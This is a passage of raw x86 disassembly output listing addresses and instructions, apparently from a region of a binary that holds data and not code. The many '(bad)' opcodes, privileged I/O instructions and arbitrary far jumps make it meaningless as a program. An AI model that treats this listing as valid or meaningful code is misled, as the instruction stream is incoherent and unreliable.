  41e9a6:	xchg   edx,eax
  41e9a7:	mov    dh,0xc1
  41e9a9:	xchg   esi,eax
  41e9aa:	or     al,0xae
  41e9ac:	push   esi
  41e9ad:	jbe    0x41e949
  41e9af:	xor    DWORD PTR [eax-0x379ea68],edx
  41e9b5:	sti    
  41e9b6:	xchg   esp,eax
  41e9b7:	push   esi
  41e9b8:	pop    ebx
  41e9b9:	mov    ecx,0x21dde779
  41e9be:	shl    DWORD PTR [ebp-0x62],1
  41e9c1:	fnstcw WORD PTR [ebx]
  41e9c3:	xor    dl,BYTE PTR [esi+0x5ef1398a]
  41e9c9:	or     ecx,DWORD PTR [esi+0x29]
  41e9cc:	outs   dx,DWORD PTR ds:[esi]
  41e9cd:	sbb    DWORD PTR [ebx],eax
  41e9cf:	mov    edi,DWORD PTR [esi-0x13]
  41e9d2:	(bad)  
  41e9d4:	add    bh,BYTE PTR [edi+ecx*1]
  41e9d7:	dec    esi
  41e9d8:	test   al,0x7c
  41e9da:	push   ecx
  41e9db:	retf   0xcf51
  41e9de:	mov    bl,0xd0
  41e9e0:	xchg   ebp,eax
  41e9e1:	or     al,bl
  41e9e3:	sbb    BYTE PTR [eax],al
  41e9e5:	adc    eax,0xda5784a9
  41e9ea:	add    al,0x9d
  41e9ec:	sti    
  41e9ed:	gs adc dh,bh
  41e9f0:	adc    dl,bh
  41e9f2:	outs   dx,DWORD PTR ds:[esi]
  41e9f3:	xchg   DWORD PTR [eax-0x73],edi
  41e9f6:	inc    eax
  41e9f7:	sar    BYTE PTR [edx-0x67],cl
  41e9fa:	std    
  41e9fb:	outs   dx,BYTE PTR ds:[esi]
  41e9fc:	(bad)  
  41e9fd:	cmp    dl,BYTE PTR [ebx+0x4b]
  41ea00:	sub    DWORD PTR [eax],ebx
  41ea02:	inc    ebx
  41ea03:	out    dx,al
  41ea04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea05:	dec    ebp
  41ea06:	pop    es
  41ea07:	nop
  41ea08:	mov    BYTE PTR [ebx+0x1f],dl
  41ea0b:	popf   
  41ea0c:	push   es
  41ea0d:	adc    eax,0x3b895600
  41ea12:	or     eax,0x90b9b60c
  41ea17:	repz push ss
  41ea19:	push   ebx
  41ea1a:	inc    edx
  41ea1b:	out    dx,eax
  41ea1c:	push   edx
  41ea1d:	add    al,0x84
  41ea1f:	or     BYTE PTR [ebx+0x9],cl
  41ea22:	jmp    0xb534161a
  41ea27:	mov    al,ds:0x97e756c
  41ea2c:	jae    0x41eaa1
  41ea2e:	inc    eax
  41ea2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea30:	repnz fdiv st(0),st
  41ea33:	mov    edx,0xe9f531df
  41ea38:	fidivr DWORD PTR ds:0x2ab7fc65
  41ea3e:	xor    eax,0x1df5eb59
  41ea43:	test   BYTE PTR [edx+0x4652e969],dh
  41ea49:	jb     0x41ea26
  41ea4b:	iret   
  41ea4c:	lock xchg BYTE PTR [esi+0x8e9e65e],bh
  41ea53:	test   eax,0x65bc8324
  41ea58:	sub    ch,dh
  41ea5a:	jg     0x41ea20
  41ea5c:	in     eax,dx
  41ea5d:	jns    0x41ea2e
  41ea5f:	outs   dx,DWORD PTR ds:[si]
  41ea61:	fdivr  QWORD PTR [eax-0x3a]
  41ea64:	ret    0xbfed
  41ea67:	lock ins DWORD PTR es:[edi],dx
  41ea69:	hlt    
  41ea6a:	je     0x41eaab
  41ea6c:	sbb    al,0x1e
  41ea6e:	sub    bh,BYTE PTR [esi]
  41ea70:	int3   
  41ea71:	sub    ebx,DWORD PTR [ecx]
  41ea73:	std    
  41ea74:	out    dx,al
  41ea75:	pop    esi
  41ea76:	or     esi,DWORD PTR [edi]
  41ea78:	sub    ah,BYTE PTR [esi-0x715fa0d7]
  41ea7e:	push   edi
  41ea7f:	ds in  al,0x9d
  41ea82:	iret   
  41ea83:	xlat   BYTE PTR ds:[ebx]
  41ea84:	inc    ecx
  41ea85:	jp     0x41eae2
  41ea87:	adc    al,0x3
  41ea89:	clc    
  41ea8a:	pop    ebp
  41ea8b:	or     DWORD PTR [ebx-0x6ab82dc6],edx
  41ea91:	mov    bl,0xb8
  41ea93:	sbb    esp,0x8ecd01c9
  41ea99:	in     al,dx
  41ea9a:	(bad)  
  41ea9b:	pushf  
  41ea9c:	mov    DWORD PTR [ebx+0x540252c3],eax
  41eaa2:	mov    al,0x85
  41eaa4:	or     eax,0x194378e4
  41eaa9:	xor    DWORD PTR [eax],ecx
  41eaab:	lods   al,BYTE PTR ds:[esi]
  41eaac:	js     0x41ea6a
  41eaae:	leave  
  41eaaf:	or     ah,BYTE PTR [esi+0x1bf0b793]
  41eab5:	bound  eax,QWORD PTR [esi+0x1f436934]
  41eabb:	(bad)  
  41eabc:	fldl2e 
  41eabe:	jb     0x41ea47
  41eac0:	sbb    BYTE PTR [esi+0x0],al
  41eac3:	dec    edi
  41eac4:	jle    0x41eb24
  41eac6:	test   BYTE PTR [ebx+0x36],ch
  41eac9:	dec    ebx
  41eaca:	int3   
  41eacb:	xchg   ecx,eax
  41eacc:	(bad)  
  41eacd:	mov    ch,0xf2
  41eacf:	leave  
  41ead0:	mov    fs,WORD PTR ds:0xf45feedc
  41ead6:	sti    
  41ead7:	push   eax
  41ead8:	pop    esi
  41ead9:	pop    ss
  41eada:	jnp    0x41eb2a
  41eadc:	jl     0x41eaa2
  41eade:	mov    ch,0x10
  41eae0:	jg     0x41ea81
  41eae2:	xchg   ebx,eax
  41eae3:	stos   DWORD PTR es:[edi],eax
  41eae4:	cwde   
  41eae5:	in     eax,0x4d
  41eae7:	pop    esp
  41eae8:	cmc    
  41eae9:	add    eax,0x3f4db4de
  41eaee:	jl     0x41eb50
  41eaf0:	fstp   DWORD PTR [edx]
  41eaf2:	das    
  41eaf3:	test   al,0x23
  41eaf5:	int    0x74
  41eaf7:	sbb    esp,DWORD PTR [ebx+0x29]
  41eafa:	ja     0x41eac4
  41eafc:	cld    
  41eafd:	cmp    al,0x64
  41eaff:	data16 aaa 
  41eb01:	fmul   QWORD PTR [edx-0x112e19ff]
  41eb07:	pop    edx
  41eb08:	cmp    al,0x94
  41eb0a:	ins    BYTE PTR es:[edi],dx
  41eb0b:	lahf   
  41eb0c:	cmp    bl,dh
  41eb0e:	ret    
  41eb0f:	mov    al,ds:0x1d885c85
  41eb14:	sbb    BYTE PTR [edx],0x86
  41eb17:	hlt    
  41eb18:	inc    DWORD PTR [edi+eax*2+0xf]
  41eb1c:	dec    ebp
  41eb1d:	and    al,BYTE PTR [esi]
  41eb1f:	sbb    dl,dl
  41eb21:	fcom   DWORD PTR [edx-0x4bfc60e2]
  41eb27:	jle    0x41eb94
  41eb29:	jb     0x41eb88
  41eb2b:	adc    bh,BYTE PTR [edx+0x63]
  41eb2e:	adc    bl,BYTE PTR [edx+0x79]
  41eb31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb32:	jae    0x41eb10
  41eb34:	fadd   DWORD PTR [edx+0x5d]
  41eb37:	push   ebp
  41eb38:	sbb    ebp,edi
  41eb3a:	cmp    ebx,esp
  41eb3c:	in     al,0xfa
  41eb3e:	cdq    
  41eb3f:	xor    eax,DWORD PTR ds:0x8f6e1bc
  41eb45:	mov    edx,DWORD PTR [ebx+0x67a64789]
  41eb4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb4c:	arpl   WORD PTR [eax],bx
  41eb4e:	lds    ecx,FWORD PTR [edi+0x2a2cec3]
  41eb54:	sar    BYTE PTR [edi-0x34922982],cl
  41eb5a:	test   DWORD PTR [esi-0x74],0x3ec06991
  41eb61:	jb     0x41eb14
  41eb63:	ret    0xb8c7
  41eb66:	or     bh,BYTE PTR [eax+eiz*8+0x506b8456]
  41eb6d:	jns    0x41ebcb
  41eb6f:	mov    DWORD PTR [edx+0x6d],ebx
  41eb72:	or     cl,dh
  41eb74:	xchg   ebx,eax
  41eb75:	dec    ebp
  41eb76:	out    0x16,al
  41eb78:	xchg   ecx,eax
  41eb79:	aad    0x78
  41eb7b:	fadd   DWORD PTR [ebx]
  41eb7d:	out    dx,al
  41eb7e:	mov    bl,0x1c
  41eb80:	jge    0x41eb95
  41eb82:	call   0xad8e9359
  41eb87:	fisttp DWORD PTR [eax+0x13fb4a10]
  41eb8d:	cdq    
  41eb8e:	dec    ecx
  41eb8f:	push   esi
  41eb90:	cmp    DWORD PTR [eax+0x5b],edi
  41eb93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb95:	adc    ah,BYTE PTR [ebp-0x270514eb]
  41eb9b:	loop   0x41ebda
  41eb9d:	adc    eax,0x13bb53fc
  41eba2:	and    eax,0x4bed19e2
  41eba7:	and    ch,BYTE PTR [edx+ebx*8+0x21]
  41ebab:	ss push ebx
  41ebad:	je     0x41eb5f
  41ebaf:	jecxz  0x41eb73
  41ebb1:	or     BYTE PTR [eax+0x32],ch
  41ebb4:	dec    edi
  41ebb5:	jp     0x41ec26
  41ebb7:	jmp    0x41ec2f
  41ebb9:	dec    ecx
  41ebba:	add    DWORD PTR [ebp+0x3e9fd084],esi
  41ebc0:	add    al,0x2e
  41ebc2:	(bad)  
  41ebc3:	retf   0xe3d6
  41ebc6:	pop    ebp
  41ebc7:	in     eax,0xcb
  41ebc9:	inc    esi
  41ebca:	fldenv [ebx-0x6e108d60]
  41ebd0:	push   ss
  41ebd1:	or     DWORD PTR [ebx],0xbfc2f869
  41ebd7:	aam    0xcc
  41ebd9:	call   0x90e8:0x7dfb8090
  41ebe0:	icebp  
  41ebe1:	in     eax,dx
  41ebe2:	and    DWORD PTR [esi+0xe869cb5],esp
  41ebe8:	xchg   ecx,eax
  41ebe9:	fs in  al,0x49
  41ebec:	mov    esp,0x74ca2edf
  41ebf1:	fistp  WORD PTR [ecx-0x3680d8d3]
  41ebf7:	cmp    al,0xa0
  41ebf9:	push   cs
  41ebfa:	pop    edi
  41ebfb:	cld    
  41ebfc:	xchg   edx,eax
  41ebfd:	rol    DWORD PTR [ebp-0x74be25be],1
  41ec03:	pop    ds
  41ec04:	in     al,dx
  41ec05:	add    DWORD PTR [edx+ebx*8],0xb459ad4e
  41ec0c:	pop    ebx
  41ec0d:	push   edi
  41ec0e:	xchg   ebp,eax
  41ec0f:	push   cs
  41ec10:	stos   DWORD PTR es:[edi],eax
  41ec11:	jae    0x41ec01
  41ec13:	xchg   dx,ax
  41ec15:	and    BYTE PTR fs:[ecx-0x17ded878],dl
  41ec1c:	push   esi
  41ec1d:	fwait
  41ec1e:	push   ebp
  41ec1f:	xchg   edi,eax
  41ec20:	retf   0x6fb3
  41ec23:	sbb    eax,DWORD PTR [ecx+eax*4-0x5e1765b9]
  41ec2a:	xchg   edx,eax
  41ec2b:	aam    0xad
  41ec2d:	lea    eax,[ebx-0x3b0afdaf]
  41ec33:	jns    0x41ebc0
  41ec35:	test   eax,0xf0500f23
  41ec3a:	jne    0x41ec60
  41ec3c:	jns    0x41ec34
  41ec3e:	loope  0x41ec67
  41ec40:	popa   
  41ec41:	cmp    eax,0x3339b14b
  41ec46:	sbb    DWORD PTR [esi],esp
  41ec48:	dec    ebx
  41ec49:	and    eax,0x1571c1ba
  41ec4e:	popf   
  41ec4f:	aad    0x77
  41ec51:	jno    0x41ec4b
  41ec53:	xchg   ecx,eax
  41ec54:	dec    esi
  41ec55:	mov    esp,edi
  41ec57:	test   edx,esi
  41ec59:	inc    ebp
  41ec5a:	mov    dl,0x5e
  41ec5c:	rcl    BYTE PTR [ebp+0x774e1fa7],cl
  41ec62:	mov    cl,0xe4
  41ec64:	ret    0x83d0
  41ec67:	cmp    eax,ebp
  41ec69:	gs ins BYTE PTR es:[edi],dx
  41ec6b:	(bad)  
  41ec6c:	cdq    
  41ec6d:	jge    0x41ecb5
  41ec6f:	dec    BYTE PTR [ecx+0x7d]
  41ec72:	sbb    al,BYTE PTR [edi+0x71]
  41ec75:	dec    ebp
  41ec76:	xchg   BYTE PTR [ecx-0x3859ad9a],cl
  41ec7c:	js     0x41ec6c
  41ec7e:	mov    eax,ds:0x33da7aea
  41ec83:	loop   0x41ec1f
  41ec85:	xor    dh,BYTE PTR [ecx+ebx*4-0x63e3878b]
  41ec8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec8d:	cmp    DWORD PTR [ebx],ecx
  41ec8f:	mov    dl,0x34
  41ec91:	arpl   WORD PTR [ebx+edx*4+0x7a50c35c],bp
  41ec98:	and    ecx,esp
  41ec9a:	and    bl,cl
  41ec9c:	in     al,0x43
  41ec9e:	fadd   QWORD PTR [ecx+0x40]
  41eca1:	dec    edi
  41eca2:	popf   
  41eca3:	scas   al,BYTE PTR es:[edi]
  41eca4:	jmp    0x41ec6f
  41eca6:	adc    al,0xaf
  41eca8:	xchg   DWORD PTR [ebp+0x4dc50190],edx
  41ecae:	dec    ebp
  41ecaf:	mov    al,ds:0x9b82223a
  41ecb4:	adc    ebx,eax
  41ecb6:	in     al,0x34
  41ecb8:	aaa    
  41ecb9:	imul   edx,edi,0xffffffab
  41ecbc:	xor    DWORD PTR [edi+edi*8],ebp
  41ecbf:	cmp    dl,BYTE PTR [esi]
  41ecc1:	mov    esi,0x7fc736fc
  41ecc6:	(bad)  
  41ecc7:	bound  edx,QWORD PTR [esi-0x9b06719]
  41eccd:	inc    esp
  41ecce:	int3   
  41eccf:	jge    0x41ed40
  41ecd1:	jge    0x41ecb5
  41ecd3:	call   0x9ef3:0x854f4b35
  41ecda:	aad    0x18
  41ecdc:	mov    dl,0xcd
  41ecde:	mov    ebp,0x82930c14
  41ece3:	iret   
  41ece4:	jo     0x41ecac
  41ece6:	cmp    bh,al
  41ece8:	aam    0x2d
  41ecea:	jnp    0x41ec9f
  41ecec:	jge    0x41ed57
  41ecee:	mov    eax,0xa2a0bffa
  41ecf3:	leave  
  41ecf4:	push   esp
  41ecf5:	mov    ecx,0xbae78710
  41ecfa:	sti    
  41ecfb:	jle    0x41ed46
  41ecfd:	mov    edi,0x6c50d884
  41ed02:	ret    0x9574
  41ed05:	out    0x31,al
  41ed07:	push   edi
  41ed08:	cmp    al,0xc0
  41ed0a:	cli    
  41ed0b:	fmul   st,st(1)
  41ed0d:	jmp    0x7312:0x629e1ed0
  41ed14:	push   eax
  41ed15:	retf   
  41ed16:	ss out dx,eax
  41ed18:	inc    esp
  41ed19:	push   cs
  41ed1a:	fsub   QWORD PTR [esi+0x448373f7]
  41ed20:	mov    ebp,0xbec3fff6
  41ed25:	or     BYTE PTR [ebp+esi*1-0x6f],0x3f
  41ed2a:	je     0x41ed34
  41ed2c:	retf   0x1609
  41ed2f:	add    al,0x68
  41ed31:	imul   esi,esp,0xffffffc9
  41ed34:	jno    0x41ed28
  41ed36:	xor    BYTE PTR [edi],dh
  41ed38:	sbb    DWORD PTR [edi],ebp
  41ed3a:	push   ds
  41ed3b:	(bad)  
  41ed3c:	jp     0x41ed3a
  41ed3e:	inc    edi
  41ed3f:	scas   al,BYTE PTR es:[edi]
  41ed40:	cmp    edx,ecx
  41ed42:	inc    esi
  41ed43:	mov    cl,0x6f
  41ed45:	inc    edx
  41ed46:	cmp    al,cl
  41ed48:	sub    eax,DWORD PTR [edx]
  41ed4a:	fsubr  QWORD PTR [ebx+ebx*1+0x4]
  41ed4e:	or     al,0x4a
  41ed50:	je     0x41ed9d
  41ed52:	int3   
  41ed53:	mov    bh,0x74
  41ed55:	loopne 0x41ecf7
  41ed57:	cvtps2pi mm5,QWORD PTR [esi+0x423a7481]
  41ed5e:	inc    ebx
  41ed5f:	pop    edx
  41ed60:	outs   dx,DWORD PTR ds:[esi]
  41ed61:	sbb    BYTE PTR [ecx+0x6a5df9c0],ah
  41ed67:	retf   
  41ed68:	les    esi,FWORD PTR [esi]
  41ed6a:	imul   edi,DWORD PTR [edi],0xa1824cf
  41ed70:	cmp    al,0xb4
  41ed72:	inc    esi
  41ed73:	sbb    ebx,esi
  41ed75:	adc    edi,DWORD PTR [ecx]
  41ed77:	adc    edx,esp
  41ed79:	jns    0x41ed16
  41ed7b:	call   0x29893a3c
  41ed80:	mov    cl,0x18
  41ed82:	and    eax,0x41969b25
  41ed87:	mov    ds:0xdebd5f58,al
  41ed8c:	xor    al,0x40
  41ed8e:	mov    al,ds:0x1803ee61
  41ed93:	add    BYTE PTR [edx-0x60220f9c],al
  41ed99:	sub    al,0xbd
  41ed9b:	(bad)  
  41ed9c:	pusha  
  41ed9d:	inc    esi
  41ed9e:	inc    BYTE PTR [ebx]
  41eda0:	pusha  
  41eda1:	ds aam 0xf6
  41eda4:	jno    0x41edbf
  41eda6:	fs jmp 0x7738:0xd879e3b8
  41edae:	xor    al,0x56
  41edb0:	cmp    al,0x26
  41edb2:	loop   0x41ede8
  41edb4:	xor    eax,0xe63b06cb
  41edb9:	cmc    
  41edba:	ins    BYTE PTR es:[edi],dx
  41edbb:	mov    ch,0x1f
  41edbd:	mov    ch,BYTE PTR [esi+esi*2-0x6c4eb07e]
  41edc4:	dec    edx
  41edc5:	mov    esp,0x1bd84d57
  41edca:	addr16 in eax,dx
  41edcc:	jge    0x41ed9f
  41edce:	and    eax,0xaa7f36f0
  41edd3:	xchg   ebp,eax
  41edd4:	imul   ecx,ecx,0x39
  41edd7:	mov    bl,0xbd
  41edd9:	cmp    BYTE PTR [ecx],bl
  41eddb:	arpl   WORD PTR [eax+edi*4],dx
  41edde:	sbb    eax,DWORD PTR [ecx-0x6b]
  41ede1:	loope  0x41edea
  41ede3:	sbb    al,0x13
  41ede5:	or     BYTE PTR [edi+0x24],ah
  41ede8:	jno    0x41ee18
  41edea:	cli    
  41edeb:	pop    ds
  41edec:	sub    eax,0x3d9fd4f0
  41edf1:	mov    ?,WORD PTR [esp+eax*1+0x3b]
  41edf5:	xor    dh,ch
  41edf7:	xchg   edx,eax
  41edf8:	stos   BYTE PTR es:[edi],al
  41edf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edfa:	mov    ebx,0x22820328
  41edff:	in     al,dx
  41ee00:	in     al,0x2c
  41ee02:	sub    BYTE PTR ds:0xbefab1f,ah
  41ee08:	fistp  QWORD PTR [esi+0x29]
  41ee0b:	sbb    al,BYTE PTR [edx-0x3c]
  41ee0e:	lds    ecx,FWORD PTR ds:0x8377bab4
  41ee15:	lahf   
  41ee16:	mov    eax,0x63557992
  41ee1b:	sar    BYTE PTR [edi],0x85
  41ee1e:	xchg   ebx,eax
  41ee1f:	xor    al,0x47
  41ee21:	pop    ecx
  41ee22:	rcl    DWORD PTR [ebx+0x63],cl
  41ee25:	pop    ebx
  41ee26:	push   ss
  41ee27:	pop    ebp
  41ee28:	and    al,0x50
  41ee2a:	or     bh,BYTE PTR [ebx-0x62ef771e]
  41ee30:	push   0xda7b06c1
  41ee35:	jmp    0xb068a5ae
  41ee3a:	ds leave 
  41ee3c:	daa    
  41ee3d:	inc    edi
  41ee3e:	stc    
  41ee3f:	rcl    BYTE PTR [edx+edi*1],0x5f
  41ee43:	nop
  41ee44:	xchg   ebp,eax
  41ee45:	mov    ecx,0x30035e
  41ee4a:	stos   BYTE PTR es:[edi],al
  41ee4b:	mov    al,ds:0x5d911842
  41ee50:	ins    BYTE PTR es:[edi],dx
  41ee51:	jecxz  0x41ee05
  41ee53:	xchg   esi,eax
  41ee54:	shr    DWORD PTR [esi-0x63],cl
  41ee57:	fwait
  41ee58:	pop    ebp
  41ee59:	test   BYTE PTR [edx+0x336e0e89],al
  41ee5f:	(bad)  
  41ee61:	push   es
  41ee62:	popa   
  41ee63:	pop    esp
  41ee64:	ins    DWORD PTR es:[edi],dx
  41ee65:	sub    DWORD PTR [esi],0x5193ac1a
  41ee6b:	lods   eax,DWORD PTR ds:[esi]
  41ee6c:	cmp    BYTE PTR [eax+0x24],0x48
  41ee70:	inc    ebx
  41ee71:	scas   al,BYTE PTR es:[edi]
  41ee72:	outs   dx,BYTE PTR ds:[esi]
  41ee73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee74:	repz xor BYTE PTR [esi],bl
  41ee77:	leave  
  41ee78:	(bad)  
  41ee79:	repnz inc ecx
  41ee7b:	jmp    0x41ee3c
  41ee7d:	mov    DWORD PTR [ecx],eax
  41ee7f:	jne    0x41ee40
  41ee81:	xor    ecx,edx
  41ee83:	fs in  eax,0xe6
  41ee86:	pusha  
  41ee87:	aaa    
  41ee88:	ins    BYTE PTR es:[edi],dx
  41ee89:	test   BYTE PTR [ebx+0x51],ch
  41ee8c:	jne    0x41ef0a
  41ee8e:	xchg   ebx,eax
  41ee8f:	aaa    
  41ee90:	xor    DWORD PTR [edi+edi*4],0x3d
  41ee94:	imul   DWORD PTR [esi+ecx*2-0x3b]
  41ee98:	stos   DWORD PTR es:[edi],eax
  41ee99:	adc    ecx,esi
  41ee9b:	dec    ebp
  41ee9c:	and    al,0xa0
  41ee9e:	scas   al,BYTE PTR es:[edi]
  41ee9f:	xchg   edi,eax
  41eea0:	cmp    al,al
  41eea2:	xor    BYTE PTR [edi+0x72612704],ch
  41eea8:	jmp    0x6b32b8b9
  41eead:	add    DWORD PTR [edx+0x1f8b7143],esi
  41eeb3:	mul    BYTE PTR [ebx]
  41eeb5:	scas   al,BYTE PTR es:[edi]
  41eeb6:	jg     0x41eea3
  41eeb8:	out    dx,eax
  41eeb9:	in     eax,dx
  41eeba:	in     eax,dx
  41eebb:	xchg   edi,eax
  41eebc:	leave  
  41eebd:	addr16 mov al,0xc1
  41eec0:	fadd   DWORD PTR [ebx-0x75d0c46a]
  41eec6:	or     ecx,DWORD PTR [ebp-0x19]
  41eec9:	cmp    esi,DWORD PTR [edi+0x2f]
  41eecc:	xor    BYTE PTR [eax+0x5e],0xb8
  41eed0:	retf   
  41eed1:	fst    QWORD PTR [ebx+0x1c0aaa6e]
  41eed7:	aad    0x3f
  41eed9:	out    dx,al
  41eeda:	add    al,0x9f
  41eedc:	inc    ecx
  41eedd:	cdq    
  41eede:	je     0x41eee7
  41eee0:	outs   dx,BYTE PTR ds:[esi]
  41eee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eee2:	adc    dh,ch
  41eee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eee5:	fwait
  41eee6:	retf   0x4c69
  41eee9:	mov    ch,0x5
  41eeeb:	shr    BYTE PTR [eax],cl
  41eeed:	loop   0x41ee77
  41eeef:	daa    
  41eef0:	repnz clc 
  41eef2:	loope  0x41ef4d
  41eef4:	test   al,0xb6
  41eef6:	icebp  
  41eef7:	mov    ecx,DWORD PTR [edi+0x77d46ca4]
  41eefd:	(bad)  
  41eefe:	or     BYTE PTR [ebx+0x27aaeeb0],ah
  41ef04:	retf   
  41ef05:	test   al,0xdb
  41ef07:	add    al,0x48
  41ef09:	rcr    DWORD PTR [ecx+0x1b4b014a],0x42
  41ef10:	jge    0x41ef5e
  41ef12:	pop    ebp
  41ef13:	pop    ecx
  41ef14:	and    eax,0xa748dd5f
  41ef19:	xchg   DWORD PTR [ebp-0xb],edx
  41ef1c:	push   ebp
  41ef1d:	cmp    al,0xeb
  41ef1f:	out    dx,eax
  41ef20:	lods   al,BYTE PTR ds:[esi]
  41ef21:	in     al,0x63
  41ef23:	mov    BYTE PTR [edi-0x9],dh
  41ef26:	retf   
  41ef27:	dec    edx
  41ef28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef29:	pop    esp
  41ef2a:	push   ebp
  41ef2b:	stc    
  41ef2c:	rcl    DWORD PTR [ebx],1
  41ef2e:	clc    
  41ef2f:	nop
  41ef30:	mov    WORD PTR [esi],?
  41ef32:	mov    cl,0xf7
  41ef34:	pusha  
  41ef35:	sbb    al,0x33
  41ef37:	xchg   BYTE PTR [eax+0x2e],ah
  41ef3a:	jmp    0xd7f71731
  41ef3f:	hlt    
  41ef40:	lahf   
  41ef41:	xchg   edx,eax
  41ef42:	(bad)  
  41ef44:	and    edi,edx
  41ef46:	out    dx,eax
  41ef47:	pop    edx
  41ef49:	test   al,0xf9
  41ef4b:	mov    ebx,0xce903123
  41ef50:	mov    dl,0x30
  41ef52:	in     al,0xb
  41ef54:	or     bh,BYTE PTR [edx-0x4288eebd]
  41ef5a:	xlat   BYTE PTR ds:[ebx]
  41ef5b:	cmc    
  41ef5c:	test   al,0x8f
  41ef5e:	sbb    al,0xd8
  41ef60:	xor    esp,DWORD PTR [ecx-0x26]
  41ef63:	jmp    0xed44:0x1368e334
  41ef6a:	(bad)
  41ef6f:	push   ds
  41ef70:	push   0xffffff85
  41ef72:	inc    esi
  41ef73:	inc    eax
  41ef74:	cmp    DWORD PTR [edi],edx
  41ef76:	nop
  41ef77:	xor    eax,0xde877f56
  41ef7c:	inc    ebx
  41ef7d:	inc    ebx
  41ef7e:	and    DWORD PTR [eax+0x22],esi
  41ef81:	stos   BYTE PTR es:[edi],al
  41ef82:	bnd jle 0x41efc1
  41ef85:	push   ecx
  41ef86:	leave  
  41ef87:	inc    eax
  41ef88:	push   0xa8d7e3bb
  41ef8d:	and    al,0xc2
  41ef8f:	arpl   WORD PTR [edx+0x75],ax
  41ef92:	icebp  
  41ef93:	cmp    al,0xe4
  41ef95:	(bad)  
  41ef96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef97:	sub    edx,DWORD PTR [edx+eiz*1+0x3f375c30]
  41ef9e:	pop    ecx
  41ef9f:	mov    ds:0x12141045,al
  41efa4:	cwde   
  41efa5:	sbb    BYTE PTR [esi+0x46],ch
  41efa8:	(bad)  
  41efa9:	popa   
  41efaa:	jno    0x41ef60
  41efac:	and    DWORD PTR [edi],esi
  41efae:	jecxz  0x41ef57
  41efb0:	out    dx,eax
  41efb1:	or     dl,BYTE PTR [esi]
  41efb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efb4:	jmp    0x3493:0x43fd088b
  41efbb:	(bad)  
  41efbc:	or     al,0x82
  41efbe:	xor    DWORD PTR [ecx],edi
  41efc0:	in     al,dx
  41efc1:	adc    al,0x14
  41efc3:	ja     0x41efed
  41efc5:	inc    esp
  41efc6:	adc    DWORD PTR [edi-0x4],0x3a
  41efca:	mov    edx,0xd0d194aa
  41efcf:	xchg   esi,eax
  41efd0:	sbb    BYTE PTR [ecx+0x17],al
  41efd3:	nop
  41efd4:	sub    ch,BYTE PTR [esi+0x3e65eba6]
  41efda:	push   ebp
  41efdb:	mov    ds:0xed5063bd,eax
  41efe0:	jmp    0x41efc8
  41efe2:	inc    esp
  41efe3:	lods   al,BYTE PTR ds:[esi]
  41efe4:	fwait
  41efe5:	xor    al,0xc2
  41efe7:	jb     0x41f048
  41efe9:	cmp    esp,0x75ec184
  41efef:	or     ch,cl
  41eff1:	jbe    0x41ef8d
  41eff3:	cmp    eax,0x8ec9238b
  41eff8:	mov    al,dh
  41effa:	add    eax,0xb26b5e24
  41efff:	mov    esp,0x494811c4
  41f004:	jmp    0x41f009
  41f006:	dec    BYTE PTR [edi+0x404645f1]
  41f00c:	(bad)  
  41f00e:	pusha  
  41f00f:	cli    
  41f010:	fistp  DWORD PTR [eax]
  41f012:	pop    eax
  41f013:	inc    edi
  41f014:	popf   
  41f015:	push   0x3d9e3527
  41f01a:	inc    ebp
  41f01b:	not    bh
  41f01d:	dec    ebp
  41f01e:	or     bh,ch
  41f020:	inc    esi
  41f021:	jne    0x41f064
  41f023:	jns    0x41f09a
  41f025:	loope  0x41efd3
  41f027:	mov    ecx,0xc222f045
  41f02c:	test   al,0x6d
  41f02e:	xor    esp,DWORD PTR [edx-0x5c]
  41f031:	mov    WORD PTR [edi+0xb],?
  41f034:	jb     0x41f04c
  41f036:	sbb    ecx,DWORD PTR [eax-0x35]
  41f039:	das    
  41f03a:	cmc    
  41f03b:	ins    DWORD PTR es:[edi],dx
  41f03c:	push   es
  41f03d:	std    
  41f03e:	arpl   WORD PTR [edx+0x7],si
  41f041:	(bad)  
  41f042:	cmp    al,0xfd
  41f044:	into   
  41f045:	jecxz  0x41f08f
  41f047:	aad    0x30
  41f049:	cdq    
  41f04a:	mov    al,0xdd
  41f04c:	jmp    0xeeb6:0xecf3f885
  41f053:	stos   DWORD PTR es:[edi],eax
  41f054:	fwait
  41f055:	in     eax,dx
  41f056:	inc    ebp
  41f057:	mov    esp,0xf58fb536
  41f05c:	inc    ecx
  41f05d:	(bad)  
  41f05e:	stos   BYTE PTR es:[edi],al
  41f05f:	stc    
  41f060:	jle    0x41f09b
  41f062:	or     DWORD PTR [bp+di],esp
  41f065:	in     eax,dx
  41f066:	adc    al,0x72
  41f068:	cmp    al,0xde
  41f06a:	sub    ah,dl
  41f06c:	aaa    
  41f06d:	mov    edi,0xca3fbee8
  41f072:	retf   0x2f4c
  41f075:	cmp    cl,dl
  41f077:	enter  0x66a6,0x7c
  41f07b:	xchg   ecx,eax
  41f07c:	and    BYTE PTR [ebx+ebp*8],0x94
  41f080:	into   
  41f081:	jbe    0x41f03b
  41f083:	ins    BYTE PTR es:[edi],dx
  41f084:	into   
  41f085:	clc    
  41f086:	jmp    eax
  41f088:	rcl    DWORD PTR [edi],0x21
  41f08b:	push   ecx
  41f08c:	mov    esp,0xab237e75
  41f091:	test   al,0x71
  41f093:	xchg   ecx,eax
  41f094:	pop    ebp
  41f095:	cs pushf 
  41f097:	or     eax,0x10791ce2
  41f09c:	mov    ebx,0x3ae475a7
  41f0a1:	pop    ebp
  41f0a3:	fnstcw WORD PTR [esi-0x2829d292]
  41f0a9:	cld    
  41f0aa:	pop    ebx
  41f0ab:	sbb    eax,0xb9338b2c
  41f0b0:	fwait
  41f0b1:	pushf  
  41f0b2:	push   es
  41f0b3:	retf   
